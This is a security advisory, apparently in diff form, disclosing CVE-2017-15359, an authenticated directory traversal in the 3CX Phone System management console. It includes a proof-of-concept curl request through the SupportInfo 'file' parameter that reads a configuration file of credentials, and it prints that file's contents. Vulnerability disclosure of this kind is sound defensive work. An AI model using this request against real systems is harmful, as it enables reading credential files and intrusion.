@@ -1,0 +1,101 @@
+Title:
+======
+3CX Phone System - Authenticated Directory Traversal
+
+Author:
+=======
+Jens Regel, Schneider & Wulf EDV-Beratung GmbH & Co. KG
+
+CVE-ID:
+=======
+CVE-2017-15359
+
+Risk Information:
+=================
+CVSS Base Score: 6.8
+CVSS Vector: CVSS3#AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N
+
+Timeline:
+=========
+2017-08-08 Vulnerability discovered
+2017-08-10 Asked for security contact
+2017-08-11 Send details to the vendor
+2017-09-04 Vendor has confirmed the vulnerability, will be fixed in the next release
+2017-10-16 Public disclosure
+
+Affected Products:
+==================
+3CX Phone System 15.5.3554.1 (Debian based installation)
+
+Vendor Homepage:
+================
+https://www.3cx.com/phone-system/download-links/
+
+Details:
+========
+In the 3CX Phone System 15.5.3554.1, the Management Console typically listens to port 5001 and is prone to a directory traversal attack:
+"/api/RecordingList/DownloadRecord?file=" and "/api/SupportInfo?file=" are the vulnerable parameters. An attacker must be authenticated to exploit
+this issue to access sensitive information to aid in subsequent attacks.
+
+The vulnerabilities were found during a penetration test.
+
+Proof of Concept:
+=================
+
+~$ curl -i -k --cookie ".AspNetCore.Cookies=CfDJ8PTIw(...)" https://192.168.0.1:5001/api/SupportInfo?file=/var/lib/3cxpbx/Instance1/Bin/3CXPhoneSystem.ini
+HTTP/1.1 200 OK
+Server: nginx
+Date: Tue, 08 Aug 2017 13:05:16 GMT
+Content-Type: application/octet-stream
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-3CX-Version: 15.5.3554.1
+Content-Disposition: attachment; filename="/var/lib/3cxpbx/Instance1/Bin/3CXPhoneSystem.ini"; filename*=UTF-8''%2Fvar%2Flib%2F3cxpbx%2FInstance1%2FBin%2F3CXPhoneSystem.ini
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=15768000
+
+[General]
+;connection point to call manager
+;used by:
+;a) call manager initializes own listener before it connects to configuration server.
+;b) components which are working directly with call manager
+;MUST NOT be used by components which make connection to configuration server.
+;They MUST use CM_API_IP, CM_API_PORT, CM_API_USER and CM_API_PASSWORD paramaeters to make direct connection to CallManagerAPI
+pbxSLNIC=127.0.0.1
+cmPort=5482
+pbxuser=instance_Instance158792
+pbxpass=REMOVED
+AppPath=/var/lib/3cxpbx/Instance1
+AppDataPath=/var/lib/3cxpbx/Instance1
+Tenant=Instance1
+
+[ConfService]
+;connection point to configuration server for components
+confNIC=127.0.0.1
+ConfPort=5485
+confUser=cfguser_default
+confPass=REMOVED
+
+[CfgServerProfile]
+;configuration server connection to database
+;exclusively used by configuration server
+DBHost=127.0.0.1
+DBPort=5432
+MasterDBUser=phonesystem
+MasterDBPassword=REMOVED
+MasterTable=phonesystem_mastertable
+DefFile=Objects.cls
+
+[QMDatabase]
+DBHost=127.0.0.1
+DBPort=5432
+DBName=database_single
+dbUser=logsreader_single
+dbPassword=REMOVED
+
+[MIME_TYPES]
+MESSAGE=x-chat/control
+
+Fix:
+====
+Vendor has confirmed the vulnerability, will be fixed in the next release.
